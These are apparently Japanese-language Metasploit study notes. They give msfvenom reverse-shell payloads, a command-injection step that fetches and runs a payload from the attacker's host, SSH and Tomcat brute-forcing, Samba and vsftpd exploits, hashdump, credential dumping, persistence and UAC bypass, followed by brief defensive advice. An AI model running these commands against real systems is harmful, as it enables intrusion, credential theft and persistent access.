# Metasploit

## metasploit の基礎

### postgresql

起動しておくと、metasploit が DB を使えるため実行速度が上がる

```shell
# postgresql を開始
sudo service postgresql start

# DB 初期化
sudo msfdb init

# 状態
msf6 > db_status

# Workspace 表示、切り替え、追加、削除、ヘルプ
msf6 > workspace
msf6 > workspace example
msf6 > workspace -a example
msf6 > workspace -d example
msf6 > workspace -h

# db_nmap で nmap を実行すると、結果がDBに保存される
msf6 > db_nmap -sS $TARGET
# その後、下記で表示できる。-h でヘルプ表示。
msf6 > hosts
msf6 > services
msf6 > services -S <service-name>
# hosts -R で、RHOSTS に設定できる
msf6 > hosts -R
```

### console 起動

```shell
msfconsole
```

### マルチハンドラーで Listen

```shell
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.2.22.182
set LPORT 9001
# -j を付けることでバックグラウンドで起動できる
exploit -j
```

### Help

```shell
msf6 > help
```

### 検索

検索ワードを含むエクスプロイトが表示される

```shell
searchsploit rpcbind
```

```shell
msf6 > search Windows
```

### エクスプロイトの切り替え

```shell
msf6 > use <エクスプロイト>
```

### 戻る

```shell
msf6 exploit(xxx) > back
```

### オプションを表示

```shell
msf6 exploit(xxx) > show options
```

### ターゲットを表示

```shell
msf6 exploit(xxx) > show targets
```

### 情報を表示

```shell
msf6 exploit(xxx) > show info
```

### ペイロードを表示

選択中のエクスプロイトで使えるペイロードだけ表示される

```shell
msf6 exploit(xxx) > show payloads
```

### ペイロードをセット

ペイロード名に payload/ が付いている場合は削除する

```shell
msf6 exploit(xxx) > set PAYLOAD <ペイロード>
```

### オプションを設定

```shell
msf6 exploit(xxx) > set LHOST 192.168.11.9

# setg でグローバル設定も可能（consoleを終了するまで）
msf6 exploit(xxx) > setg LHOST 192.168.11.9
```

### 実行

```shell
msf6 exploit(xxx) > run
# 同じ
msf6 exploit(xxx) > exploit
# セッションをバックグラウンドで実行する
msf6 exploit(xxx) > exploit -z
```

### モジュール構成

```shell
# 親ディレクトリ
$ ls /usr/share/metasploit-framework/modules/
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md

# 補助ツール
$ ls /usr/share/metasploit-framework/modules/auxiliary
admin    bnat    cloud    docx  example.py  fileformat  gather  pdf      server   spoof  voip
analyze  client  crawler  dos   example.rb  fuzzers     parser  scanner  sniffer  sqli   vsploit

# エンコーダー
$ ls /usr/share/metasploit-framework/modules/encoders
cmd  generic  mipsbe  mipsle  php  ppc  ruby  sparc  x64  x86

# 回避（ウイルス対策の）
$ ls /usr/share/metasploit-framework/modules/evasion
windows

# エクスプロイト
$ ls /usr/share/metasploit-framework/modules/exploits
aix        bsd     example_linux_priv_esc.rb  example_webapp.rb  hpux   mainframe  openbsd  solaris
android    bsdi    example.py                 firefox            irix   multi      osx      unix
apple_ios  dialup  example.rb                 freebsd            linux  netware    qnx      windows

# nops（ペイロードサイズを調整するための何もしない命令）
$ ls /usr/share/metasploit-framework/modules/nops
aarch64  armle  cmd  mipsbe  php  ppc  sparc  tty  x64  x86

# ペイロード
$ ls /usr/share/metasploit-framework/modules/payloads
adapters  singles  stagers  stages

# Post（エクスプロイト後の後処理）
$ ls /usr/share/metasploit-framework/modules/post
aix  android  apple_ios  bsd  firefox  hardware  linux  multi  networking  osx  solaris  windows
```

#### ペイロードの種類について

```text
generic/shell_reverse_tcp
windows/x64/shell/reverse_tcp

shellの後が _ か / かの違いに注意。
前者はインライン（単一）ペイロード、後者はステージングされたペイロード。
ステージングとは、stagersを先に配置し、そこからstagesの部分をダウンロードする方式のこと。
```

## 使用例

### 開いているポートとサービスを確認する

```shell
msf6 > nmap -sV <target>
```

### SSH バージョンをスキャンする攻撃

```shell
msf6 > use scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > show options
msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 2
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.11.12
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

### SSH ログインのブルートフォース攻撃

```shell
msf6 > search ssh login
msf6 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_login
sf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.11.12
RHOSTS => 192.168.11.12
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 3
THREADS => 3
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

### Tomcat の管理者ログインをブルートフォース攻撃

```shell
msf6 > use scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.11.12
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

## msfvenom

### ペイロードの一覧表示

```shell
msfvenom --list payloads | grep windows

# または、msfconsole で、
search type:payload platform:windows
# または
search payload/windows
```

### ペイロードに必要なオプションを表示

```shell
# msfconsole
use payload/php/meterpreter/reverse_tcp
show options
```

### 出力可能なフォーマット一覧

```shell
msfvenom --list formats
```

### ペイロード作成

種類は様々  
https://github.com/puckel/Cheatsheets/blob/master/Cheatsheet_MetasploitPayloads.txt

```shell
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f elf > shell.elf
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f exe > shell.exe
```

### エンコード指定してペイロード作成

エンコードの目的はウイルス対策を回避することではなく、ペイロードの動作を保証すること

```shell
# 'zutto_dekiru'エンコードを5回繰り返す
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f exe > shell.exe

# 繰り返すほどサイズが大きくなる
Payload size: 617 bytes
Final size of exe file: 73802 bytes
```

## コマンドインジェクションを利用する例

### ペイロード作成

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.11.9 LPORT=4444 -f elf > shell.elf
```

### HTTP サーバーに配置

```shell
sudo cp ./shell.elf /var/www/html/
```

### コマンドインジェクションでペイロードをダウンロードさせる

```shell
; wget http://192.168.11.9/shell.elf
```

### コマンドインジェクションでセッションを開始

```shell
; chmod +x shell.elf; ./shell.elf
```

### シェルを操作

```shell
sessions -i <session number>
```

## Samba の脆弱性を利用する例

```shell
use exploit/multi/samba/usermap_script
show payloads
set payload cmd/unix/reverse
exploit

[*] Command shell session 1 opened (192.168.11.9:4444 -> 192.168.11.10:52929) at 2024-11-18 21:02:16 -0500
>
```

## FTP の脆弱性を利用する例

```shell
use exploit/unix/ftp/vsftpd_234_backdoor
show payloads
set payload cmd/unix/interact
set RHOSTS 192.168.11.10
exploit

[*] Command shell session 2 opened (192.168.11.9:45565 -> 192.168.11.10:6200) at 2024-11-18 21:08:13 -0500
>
```

## meterpreter 操作

### 終了方法について

```shell
# セッション終了
exit

# セッションを維持したまま、consoleに戻る。Ctrl+Z でも同じ。
background
# 後で続けられる
sessions -i <num>
```

### meterpreter コマンドの一覧

```shell
help
```

### ファイル送受信

```shell
download /etc/passwd ./passwd

upload ./test.txt /root/
```

### シェルを起動する

```shell
shell
Process 1234 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19041.1237]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Users\victim> ipconfig
```

### hashdump

Windows の SAM（security acount manager）からローカルユーザーの播種情報を取得する

```shell
meterpreter > hashdump
```

### POST スクリプトの検索

```shell
# msfconsoleで
search post/linux
```

### POST スクリプトの実行

```shell
meterpreter > run post/linux/gather/hashdump

# RDP有効化
meterpreter > run post/windows/manage/enable_rdp
```

### モジュールのロード

```shell
meterpreter > load python
meterpreter > load kiwi
meterpreter > help
```

### kiwi

mimikatz の進化

```sh
meterpreter > load kiwi
meterpreter > help

meterpreter > creds_all
```

### 永続化の例

ユーザーがログインしたタイミングやシステムが起動したタイミングで、ペイロードが実行されるように設定する

```shell
use post/windows/manage/persistence
set SESSION <session_id>
set LHOST <attacker_ip>
set LPORT <attacker_port>
set EXE_NAME <payload>
run
```

## Windows

### incognito

```shell
# incognitoモジュールをロード
meterpreter > load incognito

# トークンを列挙
meterpreter > list_tokens -g

# トークンを偽装
meterpreter > impersonate_token "BUILTIN\Administrators"

# services.exe プロセスに移行
# NT AUTHORITY\SYSTEM になっても全てにアクセスできるとは限らないため必要な場合がある。
# これは、Windows が偽装トークンではなく、プロセスのプライマリ トークンを使用して、プロセスが実行できる操作と実行できない操作を判断するため。
meterpreter > migrate <services.exe の PID>
```

### 既存のセッションを使う例

```shell
# 既に１つセッションが確立されている状態
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  5         meterpreter x86/windows  DESKTOP-PA\buc @ DESKTOP-PA  192.168.11.9:4444 -> 192.168.11.4:56161 (192.168.11.4)

# 既存セッションを指定するタイプのエクスプロイト
search bypassuac
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_windows_store_filesys
msf6 exploit(windows/local/bypassuac_windows_store_filesys) > show options

Module options (exploit/windows/local/bypassuac_windows_store_filesys):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on

msf6 exploit(windows/local/bypassuac_windows_store_filesys) > set SESSION 5
exploit

# システムユーザーに昇格
meterpreter> getsystem
```

## セキュリティ視点

- 最重要はセキュリティパッチ適用。古いシステムの放置は極めて危険。
- Windows で認証バイパスを防止するには、「ユーザーアカウント制御の設定」で「常に通知」に設定するのが効果的
- ちょっとエンコードした程度では、主要ウイルス対策ソフトのチェックを回避できるものではない
- アウトバウンド通信の禁止は、ペイロード配置を難しくする。最小限の原則で。
